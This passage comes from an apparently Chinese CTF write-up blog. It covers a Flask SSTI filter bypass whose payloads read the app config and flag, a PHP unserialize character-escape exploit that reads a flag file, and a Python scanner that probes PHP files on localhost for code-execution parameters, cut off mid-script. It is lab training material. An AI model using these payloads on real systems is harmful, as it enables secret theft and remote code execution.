    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine&gt;'</span><span class="token punctuation">)</span>
<span class="token comment">#这是一个动态的 URL 部分，其中 &lt;...&gt; 表示这是一个变量部分，path 是变量的类型，shrine 是变量的名称。path 类型表示这个变量可以匹配任意的路径，包括斜杠 /，也就是说它能捕获 /shrine/ 后面的任意字符串，并且会将捕获到的内容作为参数传递给对应的视图函数。</span>
<span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#将 some/path 作为参数传递给 shrine 变量。</span>

    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span><span class="token comment">#普通的{{config}}或者{{self}}无法使用</span>
        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'{{% set {}=None%}}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s
    <span class="token comment">#join 是字符串对象的一个方法，用于将一个可迭代对象（如列表）中的元素用指定的字符串连接起来。这里使用空字符串 '' 作为连接符，将列表中的元素依次拼接成一个完整的字符串。</span>
 <span class="token comment">#列表推导式会遍历 blacklist 列表中的每个元素 c，并将其插入到 '{{% set {}=None%}}' 这个字符串模板中，生成一个新的字符串列表。</span>
<span class="token comment">#{{% ... %}} 是 Jinja2 模板的标签语法，用于在模板中执行 Python 代码。</span>
<span class="token comment">#set 是 Jinja2 模板中的一个语句，用于定义变量。</span>
<span class="token comment">#{} 是 Python 字符串格式化中的占位符，format(c) 会将 c 的值填充到这个占位符中。</span>

    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2130787">一文了解SSTI和所有常见payload 以flask模板为例-腾讯云开发者社区-腾讯云</a></p>
<p>过滤了小括号</p>
<p>用python的内置函数</p>
<p><code>config.items</code> 一个类字典的对象 , 包含了所有应用程序的配置值</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment">#搜索app,发现current_app </span>
<span class="token comment">#在Flask中，current_app是代理对象，指向当前的app实例。</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment">#有FLAG</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

<span class="token punctuation">{</span><span class="token punctuation">{</span>get_flashed_messages<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但safe_jinja函数中的处理是，将config设置为None。因为在safe_jinja函数中，会将黑名单中的每个词（config和self）用这样的语句设置为None。所以在模板渲染的时候，config变量会被设置为None，而无法访问原来的config对象。</p>
<p>但current_app是另一个变量，可能没有被覆盖。比如，假设在模板中，我们可以访问到current_app，然后通过current_app.config来获取配置。这时候，虽然config变量被设置为None，但current_app的config属性可能依然存在。</p>
<hr>
<h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span><span class="token class-name type-declaration">php</span>

<span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span><span class="token comment">#把数组元素组合为字符串</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#销毁会话</span>
<span class="token punctuation">}</span>

<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>

<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#将 POST 请求中的所有参数提取到当前作用域中，使它们可以直接作为变量使用。</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#存储在会话中</span>
<span class="token punctuation">}</span>

<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>phpinfo</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4aa1149f0ed5bfab15fcf48cf2bdbc94.png"></p>
<p>d0g3_f1ag.php</p>
<blockquote>
<p>extract会把POST的参数变成当前作用域的变量，如果POST中有同名的变量，可能会覆盖已有的变量。例如，如果POST中有_SESSION参数，可能会被覆盖</p>
</blockquote>
<p>但是后面的 $_SESSION[‘img’]覆盖不了</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107135706">PHP反序列化字符逃逸详解_php filter字符串溢出-CSDN博客</a></p>
<p>检测到’flag’等关键字就把其替换为空，那么就利用这一点，我们故意输入敏感字符，替换为空之后来实现字符逃逸。</p>
<p>img随便传，会被替换成base64(‘guest_img.png’)即’ZDBnM19mMWFnLnBocA==’</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span><span class="token class-name type-declaration">php</span>
<span class="token variable">$sessionData</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string single-quoted-string">'q'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'img'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'ZDBnM19mMWFnLnBocA=='</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'xaxa'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">';s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";i:0;i:1;'</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$sessionData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"q"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xaxa"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token string double-quoted-string">";s:3:"</span>img<span class="token string double-quoted-string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string double-quoted-string">";i:0;i:1;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>要覆盖<code>";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"xaxa";s:47:</code>总共56个字。</p>
<p>故用<code>flagflagflagflagflagflagflagflagflagflagflagflagflagflag</code>代</p>
<p>先<code>d0g3_f1ag.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"q"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">56</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flagflagflagflagflagflagflagflagflagflagflagflagflagflag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xaxa"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token string double-quoted-string">";s:3:"</span>img<span class="token string double-quoted-string">";s:20:"</span>L2QwZzNfZmxsbGxsbGFn<span class="token string double-quoted-string">";i:0;i:1;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>i:7;i:8</code>， i代表数字，7代表键，就是7，值也是数字，值为8，索引为7，值为8，以满足最前面<code>a:3:</code>中的3</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>q<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflagflagflagflagflagflagflagflagflag<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>img<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>xaxa<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在<code>/d0g3_fllllllag</code>里</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>q<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflagflagflagflagflagflagflagflagflag<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>img<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>xaxa<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"L2QwZzNfZmxsbGxsbGFn"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

flag<span class="token punctuation">{</span><span class="token number">656</span>ea1d3<span class="token operator">-</span>a8aa<span class="token operator">-</span><span class="token number">4</span>a62<span class="token operator">-</span><span class="token number">9</span>b02<span class="token operator">-</span><span class="token number">0</span>a58d00e7421<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><del>话说有些wp还有时效性什么的（</del></p>
<hr>
<h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p><code>cat '/home/kali/桌面/1/www.tar.gz'      </code></p>
<p>爆出来一堆php，真无敌了</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/23d98d2c9a93b3e8a0e0f0676e8b0c2d.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e1d0cf566f69b2cb3dc6a760d7d2a594.png"></p>
<p>都是这种形式的（</p>
<p>找一个存在的GET/POST传参叭</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e52154188acc">python多线程-Semaphore(信号对象) - 简书</a></p>
<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/102945940">强网杯 2019]高明的黑客(考察代码编写能力)-CSDN博客</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os  <span class="token comment"># os：用于操作文件和目录路径。</span>
<span class="token keyword">import</span> requests  <span class="token comment"># requests：发送HTTP请求。</span>
<span class="token keyword">import</span> re  <span class="token comment"># re：正则表达式匹配，用于提取参数。</span>
<span class="token keyword">import</span> threading  <span class="token comment"># threading：实现多线程并发。</span>
<span class="token keyword">import</span> time  <span class="token comment"># time：获取和处理时间信息。</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'开始时间：  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 记录脚本启动时间。</span>
s1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token comment"># 这儿设置最大的线程数.控制最大并发线程数为100，防止资源耗尽。</span>
<span class="token triple-quoted-string string">"""信号量是一种用于控制并发访问资源的同步原语。它本质上是一个计数器，在多线程编程里，信号量可以限制同时访问某个资源或者执行某段代码的线程数量。当一个线程想要访问受信号量保护的资源时，它需要先获取信号量；当线程使用完资源后，需要释放信号量，这样其他线程才有机会获取信号量并访问资源。"""</span>
filePath <span class="token operator">=</span> <span class="token string">r"D:\phpstudy_pro\WWW\src"</span>
os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>  <span class="token comment"># 改变当前的路径</span>
requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">=</span> <span class="token number">5</span>  <span class="token comment"># 设置重连次数，防止线程数过高，断开连接.增强网络请求的健壮性。</span>
files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>  <span class="token comment"># 获取目录下所有文件</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>keep_alive <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment"># 设置连接活跃状态为False。禁用Keep-Alive以避免连接池问题。</span>


<span class="token keyword">def</span> <span class="token function">get_content</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s1<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 获取信号量，控制并发</span>
    <span class="token triple-quoted-string string">"""信号量计数器大于 0：如果当前信号量的计数器大于 0，说明还有可用的资源，线程会成功获取信号量，同时信号量的计数器会减 1。例如，若初始计数器值为 100，一个线程成功获取信号量后，计数器变为 99。
信号量计数器等于 0：如果当前信号量的计数器为 0，意味着已经没有可用的资源了，此时线程会被阻塞，进入等待状态，直到有其他线程释放信号量，使得计数器的值大于 0，该线程才有机会获取信号量并继续执行。"""</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'trying   '</span> <span class="token operator">+</span> <span class="token builtin">file</span> <span class="token operator">+</span> <span class="token string">'     '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 打印日志：输出当前正在处理的文件和时间。</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment"># 打开php文件，提取所有的$_GET和$_POST的参数</span>
        gets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 正则匹配：从PHP代码中提取所有$_GET['param']和$_POST[</span>
        <span class="token comment"># 'param']的参数名。list() 函数可以确保结果是一个列表类型</span>
        <span class="token triple-quoted-string string">"""re.findall() 是 re 模块中的一个函数，用于在字符串中查找所有匹配指定正则表达式的子字符串，并将这些匹配结果以列表的形式返回。它的基本语法是 re.findall(pattern, 
        string)，其中 pattern 是正则表达式，string 是要搜索的字符串"""</span>
        posts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># 所有的$_POST</span>
    params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># 所有的$_GET</span>
    <span class="token keyword">for</span> m <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'hahahahahah';"</span>  <span class="token comment"># 为每个GET/POST参数赋值echo 'hahahahahah';，用于检测代码执行漏洞。如果参数值被直接执行，响应中会包含xxxxxx。</span>
    <span class="token keyword">for</span> n <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'hahahahahah';"</span>
    url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/src/'</span> <span class="token operator">+</span> <span class="token builtin">file</span>
    req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>  <span class="token comment"># 一次性请求所有的GET和POST</span>
    req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 关闭请求  释放内存</span>
    req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
    content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
    <span class="token comment"># print(content)</span>
    <span class="token keyword">if</span> <span class="token string">"hahahahahah"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>  <span class="token comment"># 如果发现有可以利用的参数，继续筛选出具体的参数</span>
        flag <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> a <span class="token keyword">in</span> gets<span class="token punctuation">:</span>  <span class="token comment"># 如果在GET参数中找到，flag=1，否则检查POST。</span>
            req <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
                url <span class="token operator">+</span> <span class="token string">'?%s='</span> <span class="token operator">%</span> a <span class="token operator">+</span> <span class="token string">"echo 'hahahahahah';"</span><span class="token punctuation">)</span>  <span class="token comment"># %s 是一个占位符，会被变量 a 的值替换。http://127.0.0.1/src/your_file.php</span>
            <span class="token comment"># ?param1=echo 'hahahahahah';</span>
            content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
            req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 关闭请求  释放内存</span>
            <span class="token keyword">if</span> <span class="token string">"hahahahahah"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
                flag <span class="token operator">=</span> <span class="token number">1</span>
                <span class="token keyword">break</span>
        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> b <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
                req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span> <span class="token string">"echo 'hahahahahah';"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment"># {'param': "echo 'hahahahahah';"}</span>
                content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
                req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 关闭请求  释放内存</span>
                <span class="token keyword">if</span> <span class="token string">"hahahahahah"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span>
